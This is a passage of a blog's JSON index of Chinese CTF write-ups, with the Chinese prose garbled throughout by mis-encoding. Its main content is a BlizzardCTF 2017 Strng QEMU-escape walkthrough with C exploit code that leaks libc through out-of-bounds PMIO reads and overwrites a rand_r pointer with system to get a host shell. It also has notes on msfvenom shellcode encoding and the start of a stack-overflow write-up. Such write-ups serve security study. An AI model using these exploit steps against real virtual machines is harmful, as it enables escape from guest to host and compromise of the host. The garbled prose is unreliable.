åæ‰æ˜¯æˆ‘ä»¬çœŸæ­£èµ·ä½œç”¨çš„shellcodeã€‚åˆ©ç”¨pythonè„šæœ¬å³å¯ã€‚\n\n \n\n \n\n \n\nâ–²\n\n1.â€™import sys; sys.stdout.write(â€œshellcodeâ€)â€™ï¼šè¿™æ˜¯å¯¼å…¥åŒ…ä¹‹åå†™å…¥ç¼–ç çš„shellcodeã€‚\n\n2.ç”±äºmsfvenomåªèƒ½ä»stdinä¸­è¯»å–ï¼Œæ‰€ä»¥ä½¿ç”¨Linuxç®¡é“ç¬¦â€|â€æ¥ä½¿å¾—shellcodeä½œä¸ºpythonç¨‹åºçš„è¾“å‡ºã€‚\n\n3.æ­¤å¤–é…ç½®ç¼–ç å™¨ä¸ºx86/alpha_mixedï¼Œé…ç½®ç›®æ ‡å¹³å°æ¶æ„ç­‰ä¿¡æ¯ï¼Œè¾“å‡ºåˆ°æ–‡ä»¶åä¸ºpayloadçš„æ–‡ä»¶ä¸­ã€‚\n\n4.ç”±äºåœ¨b-64-b-tuffä¸­æ˜¯é€šè¿‡æŒ‡ä»¤call eaxè°ƒç”¨shellcodeçš„eax,æ‰€ä»¥é…ç½®BufferRegister=EAXã€‚æœ€åå³å¯åœ¨payloadä¸­çœ‹åˆ°å¯¹åº”çš„è¢«ç¼–ç åçš„ä»£ç ã€‚è¿™æ®µshellcodeä»£ç å°±å¯ä»¥è¢«base64ç¼–ç æˆæˆ‘ä»¬éœ€è¦çš„æ±‡ç¼–ä»£ç ã€‚\n\n \n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["shellcode"],"categories":["PWN","Shellcode0x2"]},{"title":"BlizzardCTF2017-Strng","url":"/2021/08/14/BlizzardCTF2017-Strng/","content":"\n1.æ‰“å¼€è™šæ‹Ÿç¯å¢ƒï¼Œç„¶åéƒ½è¯´flagåœ¨/root/flagï¼Œç»™çš„ä¹Ÿä¸æ˜¯vmlinuxï¼Œé‚£ä¹ˆå°±åº”è¯¥æ˜¯qemué€ƒé€¸ã€‚\n\n2.ç”±äºåªæœ‰æ–‡ä»¶ï¼Œå¤§ä½¬ä»¬éƒ½ç›´æ¥å‘Šè¯‰ç”¨æˆ·åå¯†ç ï¼Œä¹Ÿæ²¡è¯´æ€ä¹ˆæ‰¾ï¼Œé‚£å°±å½“ä½œæœ¬æ¥é¢˜ç›®ç»™äº†ç”¨æˆ·åå’Œå¯†ç ã€‚ç”¨æˆ·åæ˜¯ubuntuï¼Œå¯†ç æ˜¯passw0rdã€‚\n\n3.å°†qemu-system-x86_64æ‹–åˆ°IDAä¸­å¼€å§‹åˆ†æï¼Œä¼šåˆ†æå¾ˆé•¿ä¸€æ®µæ—¶é—´ï¼Œå…ˆçœ‹çœ‹å¯åŠ¨å‚æ•°ï¼Œlaunch.shï¼š\n\n```\n./qemu-system-x86_64 \\\n    -m 1G \\\n    -device strng \\\n    -hda my-disk.img \\\n    -hdb my-seed.img \\\n    -nographic \\\n    -L pc-bios/ \\\n    -enable-kvm \\\n    -device e1000,netdev=net0 \\\n    -netdev user,id=net0,hostfwd=tcp::5555-:22\n```\n\næ²¡å•¥å¥½æ³¨æ„çš„ï¼Œæ˜¾ç¤ºåŠ è½½äº†è®¾å¤‡strngï¼Œé‚£ä¹ˆè¿™åº”è¯¥å°±æ˜¯éœ€è¦åˆ†æçš„PCIè®¾å¤‡ã€‚ç„¶åæœ€åä¸€è¡Œnetdev user,id=net0,hostfwd=tcp::5555-:22ï¼ŒæŠŠ22ç«¯å£é‡å®šå‘åˆ°äº†å®¿ä¸»æœºçš„5555ç«¯å£ï¼Œæ‰€ä»¥ä½¿ç”¨ssh ubuntu@127.0.0.1 -p 5555è¿›å»ã€‚åŒæ—¶è¿™é‡Œæ³¨æ„åŠ è½½å†…å­˜è¦1Gï¼Œä¸ºäº†é˜²æ­¢å´©æºƒï¼Œæˆ‘æ”¹æˆäº†128Mã€‚\n\n4.ç„¶åè¿›å…¥qemuä¸­çœ‹çœ‹è®¾å¤‡ä¿¡æ¯ï¼Œå¥½æ‰¾åˆ°mmioå’Œpmioçš„åœ°å€ï¼š\n\n(1)é¦–å…ˆè¾“å…¥lspciï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªUnclassified device\n\n00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)\n\nè¿™ä¸ªå°±åº”è¯¥æ˜¯strngè®¾å¤‡äº†ã€‚\n\n(2)åŠ è½½IDAå®Œæˆä¹‹åéªŒè¯ä¸€ä¸‹ï¼Œå‡½æ•°æ æœç´¢strngï¼ŒæŸ¥çœ‹ç›¸å…³å‡½æ•°ã€‚å…ˆæŸ¥çœ‹è®¾å¤‡åˆå§‹åŒ–å‡½æ•°ï¼šstrng_class_initã€‚(è¿™é‡Œéœ€è¦å°†å˜é‡kçš„ç±»å‹è®¾ç½®ä¸ºPCIDeviceClass*)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502012.jpeg)\n\nå¯ä»¥çœ‹åˆ°åŠ è½½äº†strngè®¾å¤‡ï¼Œç„¶åè®¾å¤‡å·device_idæ˜¯0x11e9ï¼Œvendor_idæ˜¯0x1234ï¼Œå¯¹åº”åœ¨qemuä¸­æŸ¥çœ‹ä¸€ä¸‹åˆšæ‰çŒœæµ‹çš„strngè®¾å¤‡ï¼Œè¾“å…¥ï¼šlspci -v -s 00:03.0\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502897.jpeg)\n\nå¯ä»¥çœ‹åˆ°çŒœæµ‹æ²¡é”™ã€‚åŒæ—¶å¯ä»¥çœ‹åˆ°å¯¹åº”çš„mmioåœ°å€ä¸º0xfebf1000ï¼Œå¤§å°256ã€‚pmioçš„åœ°å€ä¸º0xc050ï¼Œå¤§å°8ã€‚\n\nâ–²æœ‰æ—¶å€™è¿™äº›å‘½ä»¤å¯èƒ½ä¸å¥½ä½¿ï¼Œåˆ¤æ–­å®Œè®¾å¤‡å·ä¹‹åï¼Œå¯ä»¥è¾“å…¥ï¼š\n\nhexdump /sys/devices/pci0000\\:00/0000\\:00\\:03.0/configæ¥æŸ¥çœ‹\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502926.jpeg)\n\n5.ä¹‹åä»readå’Œwriteå‡½æ•°ä¸­æ‰¾æ¼æ´ï¼š\n\nè¿™é‡Œå°†ç¬¬ä¸€ä¸ªå‚æ•°opaqueä¿®æ”¹ä¸‹ç±»å‹ä¸ºï¼šstruct STRNGState*ï¼Œè‡³äºä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªï¼Œæ‰“å¼€readå’Œwriteçš„æ±‡ç¼–ä»£ç ï¼Œå¾ˆæ˜æ˜¾å‘ç°æœ‰STRNGState*ï¼Œç„¶åå†è·³è½¬åˆ°ç»“æ„ä½“ç•Œé¢ä¸­æ‰¾ï¼Œè™½ç„¶ä¸å¤ªå¥½æ‰¾ã€‚æ‰¾åˆ°ä¹‹ååŒå‡»ï¼Œå¯ä»¥æ˜¾ç¤ºå‡ºç»“æ„ä½“çš„æ‰€æœ‰æˆå‘˜ï¼Œå‘ç°å°±æ˜¯éœ€è¦çš„é‚£ä¸ªï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502018.jpeg)\n\n(1)å…ˆçœ‹strng_mmio_readå‡½æ•°ï¼Œè¯»å…¥addrå¹¶æŒ‰äºŒè¿›åˆ¶å°†å…¶å³ç§»ä¸¤ä½ï¼Œç›¸å½“äºé™¤ä»¥4ï¼Œä¹‹åå°†ç»“æœä½œä¸ºregsæ•°ç»„çš„ç´¢å¼•ï¼Œè¿”å›è¯¥regs[add>>2]çš„å€¼ã€‚åŒæ—¶è¿˜éœ€è¦æ³¨æ„çš„æ˜¯addrçš„ä½ä¸¤ä½åªèƒ½ä¸º0ï¼Œå¦åˆ™è¿‡ä¸äº†if ( size == 4 && !(addr & 3) )çš„æ£€æŸ¥ã€‚\n\n(2)å†çœ‹strng_mmio_writeå‡½æ•°ï¼š\n\nå½“sizeç­‰äº4æ—¶ï¼Œå°†addrå³ç§»ä¸¤ä½å¾—åˆ°å¯„å­˜å™¨çš„ç´¢å¼•idxï¼Œå¹¶æä¾›4ä¸ªåŠŸèƒ½ï¼š\n\nâ‘ å½“idxä¸º0æ—¶ï¼Œè°ƒç”¨srandå‡½æ•°ä½†å¹¶ä¸ç»™èµ‹å€¼ç»™å†…å­˜ã€‚å½“iä¸º1æ—¶ï¼Œè°ƒç”¨randå¾—åˆ°éšæœºæ•°å¹¶èµ‹å€¼ç»™regs[1]ã€‚\n\nâ‘¡å½“idxä¸º3æ—¶ï¼Œè°ƒç”¨rand_rå‡½æ•°ï¼Œä½¿ç”¨regs[2]çš„åœ°å€ä½œä¸ºå‚æ•°ï¼Œæœ€åå°†è¿”å›å€¼èµ‹å€¼regs[3]ï¼Œä½†åç»­ä»ç„¶ä¼šå°†valå€¼è¦†ç›–åˆ°regs[3]ä¸­ï¼Œå°±æ˜¯è¿·æƒ‘ç”¨çš„ï¼Œå®é™…åŠŸèƒ½ä¹Ÿå°±æ˜¯å°†ä¼ å…¥çš„valueèµ‹å€¼ç»™regs[3]ã€‚\n\nâ–²ä½†æ˜¯è¿™é‡Œçš„ä¼ regs[2]çš„åœ°å€ä¹Ÿæ˜¯ä¸€ä¸ªå…³é”®ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å°†rand_rå‡½æ•°åŠ«æŒä¸ºsystemå‡½æ•°ï¼Œç„¶ååœ¨regs[2]ä¸­æ”¾å…¥\"cat /root/flag\"å­—ç¬¦ä¸²ï¼Œé‚£ä¸å°±å¯ä»¥è°ƒç”¨system(\"cat /root/flag\")ä»è€Œè¯»å–flagäº†å—ã€‚\n\nå…¶ä½™åˆ™ç›´æ¥å°†ä¼ å…¥çš„valueèµ‹å€¼ç»™regs[idx]ã€‚\n\né‚£ä¹ˆé€šè¿‡æ§åˆ¶addrï¼Œè¿›è€Œæ§åˆ¶idx>=2ï¼Œå°±å¯ä»¥é€æ¬¡å°†4ä¸ªå­—èŠ‚æ•°æ®å†™å…¥åˆ°regs[idx]ä¸Šã€‚\n\nâ–²æŒ‰ç†è¯´å¦‚æœå°†idxè¶…å‡ºregsæ•°ç»„èŒƒå›´ï¼Œ64ä¹‹åï¼Œé‚£ä¹ˆä¸å°±å¯ä»¥ä»»æ„è¶Šç•Œå†™äº†å—ï¼Œä½†æ˜¯è¿™é‡Œä¸è¡Œï¼Œå› ä¸ºä¼ å…¥çš„addræ˜¯ä¸èƒ½å¤§äºmmioçš„å¤§å°ï¼Œpciè®¾å¤‡å†…éƒ¨ä¼šè¿›è¡Œæ£€æŸ¥ï¼Œè€Œåˆšå¥½regsçš„å¤§å°ä¸º256ï¼Œæ‰€ä»¥æ— æ³•é€šè¿‡mmioè¿›è¡Œè¶Šç•Œè¯»å†™ã€‚\n\n(3)æ¥ç€çœ‹strng_pmio_readå‡½æ•°ï¼šå½“ä¼ å…¥çš„ç«¯å£åœ°å€addrä¸º0æ—¶ï¼Œç›´æ¥è¿”å›opaque->addrï¼Œå¦åˆ™å°†opaque->addrå³ç§»ä¸¤ä½ä½œä¸ºç´¢å¼•idxï¼Œè¿”å›regs[idx]çš„å€¼ã€‚è¿™ä¸ªopaque->addråœ¨strng_pmio_writeä¸­è¢«èµ‹å€¼ã€‚\n\n(4)ç„¶åå†çœ‹strng_pmio_writeå‡½æ•°ï¼š\n\nå½“sizeç­‰äº4æ—¶ï¼Œä»¥ä¼ å…¥çš„ç«¯å£åœ°å€ä¸ºåˆ¤æ–­æä¾›4ä¸ªåŠŸèƒ½ï¼š\n\nâ‘ å½“ä¼ å…¥çš„ç«¯å£åœ°å€addrä¸º0æ—¶ï¼Œç›´æ¥å°†ä¼ å…¥çš„valueèµ‹å€¼ç»™opaque->addrã€‚\n\nâ‘¡å½“ä¼ å…¥çš„ç«¯å£åœ°å€addrä¸ä¸º0æ—¶ï¼Œå°†opaque->addrå³ç§»ä¸¤ä½å¾—åˆ°ç´¢å¼•idxï¼Œåˆ†ä¸ºä¸‰ä¸ªåŠŸèƒ½ï¼š\n\nA.idxä¸º0æ—¶ï¼Œæ‰§è¡Œsrandï¼Œè¿”å›å€¼ä¸å­˜å‚¨ã€‚\n\nB.idxä¸º1æ—¶ï¼Œæ‰§è¡Œrandå¹¶å°†è¿”å›ç»“æœå­˜å‚¨åˆ°regs[1]ä¸­ã€‚\n\nC.idxä¸º3æ—¶ï¼Œè°ƒç”¨rand_rå¹¶å°†regs[2]çš„åœ°å€ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè¿”å›å€¼å­˜å‚¨åˆ°regs[3]ä¸­ã€‚\nå¦åˆ™ç›´æ¥å°†valueå­˜å‚¨åˆ°regs[idx]ä¸­ã€‚\n\nâ–²è¿™é‡Œå°±å¯ä»¥è°ƒç”¨strng_pmio_writeå‡½æ•°ï¼Œå½¢æˆä»»æ„åœ°å€å†™æ¼æ´ã€‚\n\nA.é€šè¿‡å°†addrè®¾ç½®ä¸º0ï¼Œç„¶åä½¿å¾—ä¼ å…¥çš„valueç›´æ¥èµ‹å€¼ç»™opaque->addrï¼Œä½¿å¾—opaque->addrå½¢æˆçš„ç´¢å¼•idxå¤§äº64ï¼Œå°†reg[idx]è¶Šç•ŒæŒ‡å‘rand_rå‡½æ•°æŒ‡é’ˆã€‚\n\nB.ç„¶åå†æ¬¡è°ƒç”¨strng_pmio_writeå‡½æ•°ï¼Œä¼ å…¥ä¸ä¸º0çš„addrã€‚é€šè¿‡opaque->addrå½¢æˆçš„ç´¢å¼•idxï¼Œä½¿å¾—regs[idx]æŒ‡å‘rand_rå‡½æ•°æŒ‡é’ˆï¼Œå°†valueè¶Šç•Œå†™å…¥rand_rï¼ŒåŠ«æŒrand_rå‡½æ•°ã€‚\n\n6.é‚£ä¹ˆæ€»çš„åˆ©ç”¨è¿‡ç¨‹å°±æ¸…æ¥šäº†ï¼š\n\n(1)é€šè¿‡strng_mmio_writeå‡½æ•°ï¼Œå°†regs[2]èµ‹å€¼ä¸º\"cat /root/flag\"ã€‚\n\n(2)é€šè¿‡strng_pmio_writeå‡½æ•°ï¼Œå°†rand_rå‡½æ•°åŠ«æŒä¸ºsystemå‡½æ•°ã€‚\n\nä¹‹åå†è°ƒç”¨strng_mmio_writeå‡½æ•°ï¼Œä½¿å¾—idxä¸º3ï¼Œç„¶åå°†regs[2]çš„åœ°å€ä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨rand_rå‡½æ•°ï¼Œä»è€Œè°ƒç”¨system(\"cat /root/flag\")è·å–flagã€‚\n\n7.ä½†æ˜¯ç°åœ¨è¿˜éœ€è¦systemå‡½æ•°çš„åœ°å€ï¼Œé€šè¿‡ä¸Šé¢åˆ†æï¼Œå¯ä»¥å‘ç°æœ‰ä¸€ä¸ªè¶Šç•Œè¯»æ¼æ´ï¼š\n\n(1)é€šè¿‡strng_pmio_writeå‡½æ•°è®¾ç½®opaque->addrï¼Œä½¿å¾—opaque->addrå½¢æˆçš„ç´¢å¼•idxå¤§äº64ï¼Œè¿›è€Œä½¿å¾—regs[idx]æŒ‡å‘srandå‡½æ•°ã€‚\n\n(2)é€šè¿‡strng_pmio_readå‡½æ•°ï¼Œå€ŸåŠ©ä¿®æ”¹åçš„opaque->addrï¼Œè¯»å–idxç´¢å¼•regs[idx]æŒ‡å‘çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯srandå‡½æ•°æŒ‡é’ˆä¸­çš„å†…å®¹ï¼Œå¯¹åº”çš„å°±æ˜¯srandå‡½æ•°åœ°å€ã€‚\n\n(è¿™é‡Œå¤§å¤šæ•°çš„expéƒ½æ˜¯é’ˆå¯¹srandomå‡½æ•°æ¥æ³„éœ²libcçš„ï¼Œä½†randæˆ–è€…rand_råº”è¯¥ä¹Ÿéƒ½å¯ä»¥)\n\n8.é‚£ä¹ˆç°åœ¨æ€»çš„åˆ©ç”¨è¿‡ç¨‹å°±æ˜¯æ³„éœ²libcåœ°å€ï¼Œç„¶åæ”¹å†™rand_rå‡½æ•°ä¸ºsystemå‡½æ•°ï¼Œå°†\"cat /root/flag\"å†™å…¥åˆ°regs[2]ï¼Œä¹‹åé€šè¿‡rand_r(regs[2])æ¥è°ƒç”¨system(\"cat /root/flag\")ä»è€Œè·å¾—flagã€‚\n\n9.å¼€å§‹ç¼–å†™pocï¼š\n\n(1)å†™å¥½è®¿é—®pmioå’Œmmioç©ºé—´çš„è°ƒç”¨å‡½æ•°ï¼ŒåŠå‰ç½®å‚æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nunsigned char* mmio_mem;\nuint32_t pmio_base=0xc050;\n\nvoid die(const char* msg)\n{\n    perror(msg);\n    exit(-1);\n}//ç”¨æ¥æ‰“å°é”™è¯¯ä¿¡æ¯ï¼Œé€€å‡ºç”¨çš„ï¼Œä¸å†™ä¹Ÿæ²¡å…³ç³»\n\nvoid mmio_write(uint32_t addr, uint32_t value)\n{\n    *((uint32_t*)(mmio_mem + addr)) = value;\n}\n\nuint32_t mmio_read(uint32_t addr)\n{\n    return *((uint32_t*)(mmio_mem + addr));\n}\n\nuint32_t pmio_write(uint32_t addr, uint32_t value)\n{\n    outl(value,addr);\n}\n\n\nuint32_t pmio_read(uint32_t addr)\n{\n    return (uint32_t)inl(addr);\n}\n```\n\n(2)æ‰“å¼€resource0æ–‡ä»¶ï¼Œåˆ©ç”¨mmapå°†mmioç©ºé—´æ˜ å°„å‡ºæ¥ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\n// Open and map I/O memory for the strng device\nint mmio_fd = open(\"/sys/devices/pci0000:00/0000:00:03.0/resource0\", O_RDWR | O_SYNC);\nif (mmio_fd == -1)\n    die(\"mmio_fd open failed\");\n\nmmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);\nif (mmio_mem == MAP_FAILED)\n    die(\"mmap mmio_mem failed\");\n\nprintf(\"mmio_mem @ %p\\n\", mmio_mem);\n```\n\n(3)å¯¹mmioç©ºé—´è¿›è¡Œå†™æ“ä½œï¼Œè°ƒç”¨strng_mmio_writeå‡½æ•°ï¼Œå°†\"cat /root/flag\"å†™å…¥åˆ°regs[2]ä¸­ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nmmio_write(8,0x20746163);\nmmio_write(12,0x6f6f722f);\nmmio_write(16,0x6c662f74);\nmmio_write(20,0x6761);\n```\n\nè¿™é‡Œç”±äºéœ€è¦æ»¡è¶³ä¼ å…¥çš„addrå³ç§»ä¸¤ä½åå½¢æˆçš„idxéœ€è¦>=2ï¼Œæ‰€ä»¥ä»8ä¾æ¬¡å¼€å§‹ã€‚\n\n(4)ç¼–å†™pmioç©ºé—´è¶Šç•Œè¯»å’Œè¶Šç•Œå†™çš„å‡½æ•°ï¼š\n\n```\nuint32_t pmio_arbread(uint32_t offset)\n{\n    pmio_write(pmio_base+0,offset);\n    return pmio_read(pmio_base+4);\n}\n\nvoid pmio_abwrite(uint32_t offset, uint32_t value)\n{\n    pmio_write(pmio_base+0,offset);\n    pmio_write(pmio_base+4,value);\n}\n```\n\n(5)åˆ©ç”¨pmioç©ºé—´è¶Šç•Œè¯»å–æ¼æ´ï¼Œæ³„éœ²libcåœ°å€ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nif (iopl(3) !=0 )\n    die(\"I/O permission is not enough\");\n\n// leaking libc address\nuint64_t srandom_addr=pmio_arbread(0x108);\nsrandom_addr=srandom_addr<<32;\nsrandom_addr+=pmio_arbread(0x104);\n//è¿™é‡Œçš„éƒ½æ˜¯ä¸ºäº†è®¾ç½®idxä»è€Œè¯»å–ç”¨çš„\n\nprintf(\"leaking srandom addr: 0x%llx\\n\",srandom_addr);\nuint64_t libc_base= srandom_addr-0x43bb0;\nuint64_t system_addr= libc_base+0x4f440;\nprintf(\"libc base: 0x%llx\\n\",libc_base);\nprintf(\"system addr: 0x%llx\\n\",system_addr);\n//ä¸åŒçš„ä¸»æœºç¯å¢ƒçš„libcç‰ˆæœ¬ä¸åŒï¼Œéœ€è¦ä¿®æ”¹\n```\n\n(6)åˆ©ç”¨è¶Šç•Œå†™ï¼Œå°†rand_rå‡½æ•°æ”¹å†™æˆsystemå‡½æ•°\n\n```\n//æ³¨é‡Šå¤´\n\n// overwrite rand_r pointer to system\npmio_abwrite(0x114,system_addr&0xffffffff);\n\nmmio_write(0xc,0);//è¡¥0\n```\n\næœ€åç¼–è¯‘ï¼šgcc -m32 -O0 -static -o exp exp.cï¼Œç„¶åä¼ åˆ°è™šæ‹Ÿæœºé‡Œé¢ï¼Œå¯ä»¥ç”¨ä¸‹åˆ—ä¸¤ç§æ–¹æ³•ï¼š\n\nâ‘ scp -P5555 exp ubuntu@127.0.0.1:/home/ubuntuï¼Œç”±äºå¼€äº†ç«¯å£ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é€šè¿‡scpç«¯å£ä¼ è¾“ã€‚\n\nâ‘¡ä½¿ç”¨pythonåº“ç®€æ˜“æ­å»ºä¸€ä¸ªftpä¼ è¾“ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#ä¸»æœºä¸­è¿è¡Œ\npython2 -m SimpleHTTPServer\n\n#qemuä¸­è¿è¡Œï¼Œå…¶ä¸­ipåœ°å€éœ€è¦æ”¹å˜ä¸€ä¸‹ï¼Œå¯¹äºä¸»æœºip\nwget -O ./exp http://192.168.80.132:8000/exp\n```\n\næœ€åå¯ä»¥çœ‹åˆ°æˆåŠŸè¿è¡Œï¼šè¿™é‡Œæˆ‘ä¿®æ”¹äº†cat /root/flagå‘½ä»¤ï¼Œå˜æˆ/bin/shï¼Œå¯ä»¥çœ‹åˆ°è¿”å›äº†ä¸€ä¸ªä¸»æœºé‡Œé¢çš„ç»ˆç«¯shï¼ŒæˆåŠŸå®ç°é€ƒé€¸ã€‚ä½†æ˜¯è¿™ä¸ªç»ˆç«¯shè¾“å…¥å‘½ä»¤ä¸æ˜¾ç¤ºï¼Œå›æ˜¾æ¶ˆæ¯æ¯”è¾ƒæ…¢ï¼Œä½†æ˜¯ä¸ªç¡®ç¡®å®å®çš„ä¸»æœºç»ˆç«¯ï¼Œå¦‚æœæœ‰æ¡ä»¶çš„è¯ï¼Œåº”è¯¥æ˜¯å¯ä»¥å®ç°å¤šé‡é€ƒé€¸çš„ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502953.jpeg)\n\n \n\nâ–²qemué€ƒé€¸è°ƒè¯•ï¼š\n\n1.å°†expä¼ è¿›qemuä¹‹åï¼Œåœ¨ä¸»æœºä¸Šä½¿ç”¨å‘½ä»¤ps aux|grep qemuï¼Œæ‰¾åˆ°qemuçš„ä»»åŠ¡idï¼Œç„¶ågdb attach qemu_idã€‚\n\n2.ä¸‹æ–­ç‚¹åœ¨éœ€è¦çš„å‡½æ•°ï¼šb *strng_mmio_writeï¼Œç„¶åè¾“å…¥cæ¥ç€è¿è¡Œã€‚\n\n3.åœ¨qemuä¸­sudo ./expï¼Œç°åœ¨å°±èƒ½åœ¨ä¸»æœºçš„gdbä¸­åœä¸‹æ¥ï¼Œå°±å¯ä»¥è°ƒè¯•äº†ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\np *strng\np strng.regs[1]\np strng.srand\n```\n\n \n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://xz.aliyun.com/search?keyword=qemu\n\nhttps://ray-cp.github.io/archivers/qemu-pwn-Blizzard-CTF-2017-Strng-writeup\n","tags":["qemué¢˜"],"categories":["QEMU","qemu-escape"]},{"title":"BCTF 2017-100levels","url":"/2021/08/14/BCTF 2017-100levels/","content":"\n1.å¸¸è§„checksecï¼Œå¼€å¯äº†NXå’ŒPIEï¼Œä¸èƒ½shellcodeå’Œç®€å•ropã€‚ä¹‹åIDAæ‰“å¼€æ‰¾æ¼æ´ï¼ŒE43å‡½æ•°ä¸­å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n__int64 buf; // [rsp+10h] [rbp-30h]\n--------------------------------------------------\nread(0, &buf, 0x400uLL);\n```\n\næœ‰æ ˆæº¢å‡ºé‚£ä¹ˆé¦–å…ˆæƒ³åˆ°æ˜¯åº”è¯¥æŸ¥çœ‹æœ‰æ²¡æœ‰åé—¨ï¼Œä½†æ˜¯è¿™ä¸ªç¨‹åºè™½ç„¶å¤–éƒ¨å¼•ç”¨äº†systemå‡½æ•°ï¼Œä½†æ˜¯æœ¬èº«é‡Œå¹¶æ²¡æœ‰å¯¼å…¥åˆ°.got.pltè¡¨ä¸­ï¼Œæ²¡åŠæ³•ç›´æ¥é€šè¿‡.got.pltæ¥å¯»å€ã€‚è€Œä¸”å¼€äº†PIEï¼Œå°±ç®—å¯¼å…¥åˆ°.got.pltè¡¨ä¸­ï¼Œä¹Ÿéœ€è¦è¦†ç›–è¿”å›åœ°å€å¹¶ä¸”çˆ†ç ´å€’æ•°ç¬¬å››ä½æ‰èƒ½è·³è½¬åˆ°systemå‡½æ•°ã€‚è™½ç„¶æœ‰æ ˆæº¢å‡ºï¼Œä½†æ˜¯æ²¡æœ‰åé—¨å‡½æ•°ï¼ŒåŒæ ·ä¹Ÿæ²¡åŠæ³•æ³„éœ²Libcåœ°å€ã€‚\n\n2.æƒ³getshellï¼Œåˆåªæœ‰ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œæ²¡æœ‰å…¶å®ƒæ¼æ´ï¼Œè¿˜å¼€äº†PIEå’ŒNXï¼Œé‚£ä¹ˆä¸€å®šå¾—æ³„éœ²å‡ºåœ°å€æ‰èƒ½åšï¼Œè€Œprintfåœ°å€ä¹Ÿå› ä¸ºPIEæ²¡åŠæ³•ç›´æ¥è·³è½¬ã€‚é™·å…¥å¡é¡¿ï¼Œä½†æ˜¯è¿™é‡Œå¯ä»¥æŸ¥çœ‹E43å‡½æ•°ä¸­çš„printfçš„æ±‡ç¼–ä»£ç ï¼š\n\nåªèƒ½é€šè¿‡æ ˆæº¢å‡ºå½¢å¼æ¥ä¸ºä¸‹ä¸€æ¬¡çš„printfèµ‹å‚æ•°æ¥æ³„éœ²ã€‚åˆç”±äºPIEï¼Œä¹Ÿä¸çŸ¥é“ä»»æ„ä¸€ä¸ªå‡½æ•°çš„ä»£ç åœ°å€ï¼Œé‚£ä¹Ÿæ²¡åŠæ³•æ³„éœ²è¢«åŠ è½½è¿›å…¥Libcä¸­çš„å†…å­˜åœ°å€ã€‚\n\n3.é€šè¿‡è°ƒè¯•å¯ä»¥çœ‹åˆ°ï¼Œè¿›å…¥E43å‡½æ•°ä¸­ï¼ŒæŠµè¾¾printfå‡½æ•°æ—¶ï¼Œæ ˆé¡¶çš„ä¸Šæ–¹æœ‰å¤§é‡çš„æŒ‡å‘libcçš„åœ°å€ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532908.png)\n\nå¹¶ä¸”è§‚å¯ŸE43å‡½æ•°ä¸­çš„æ±‡ç¼–ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°Printfæ˜¯é€šè¿‡rbpå–å€¼çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºä¿®æ”¹rbpæ¥ä½¿å¾—[rbp+var_34]è½åœ¨å…¶å®ƒåœ°æ–¹ï¼Œè€Œå¦‚æœè¿™ä¸ªå…¶å®ƒåœ°æ–¹æœ‰libcåœ°å€ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºæ³„éœ²å‡ºäº†Libcåœ°å€ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532014.jpeg)\n\n4.è¿™ä¸ªå…³å¡æ•°æ˜¯ç”±æˆ‘ä»¬è®¾ç½®çš„ï¼Œè€Œä¸”é€šè¿‡é€’å½’è°ƒç”¨E43å‡½æ•°ï¼Œå½¢æˆå¤šä¸ªE43çš„æ ˆï¼Œé‚£ä¹ˆè¿›è¡Œè°ƒè¯•ï¼Œç¬¬äºŒæ¬¡è¿›å…¥E43çš„æ ˆä¹‹åï¼Œä»ç„¶åœ¨è¿è¡Œåˆ°printfå‡½æ•°æ—¶ï¼Œæ ˆé¡¶ä¸Šæ–¹ä»æ—§æœ‰å¤§é‡çš„Libcåœ°å€ã€‚ç”±äºæˆ‘ä»¬éœ€è¦ä¿®æ”¹rbpæ¥ä½¿å¾—ä¸‹ä¸€æ¬¡çš„printfæ‰“å°å‡ºlibcåœ°å€ï¼Œé‚£ä¹ˆå…³å¡æœ€ä½éœ€è¦è®¾ç½®ä¸¤å…³ï¼Œç¬¬ä¸€å…³ç”¨æ¥æ ˆæº¢å‡ºï¼Œä¿®æ”¹rbpï¼Œä½¿å¾—ç¬¬äºŒå…³ä¸­çš„printfå‡½æ•°æŒ‡å‘æ ˆé¡¶ä¸Šæ–¹ä»è€Œæ‰“å°å‡ºLibcåœ°å€ã€‚\n\n5.ç”±äºæ 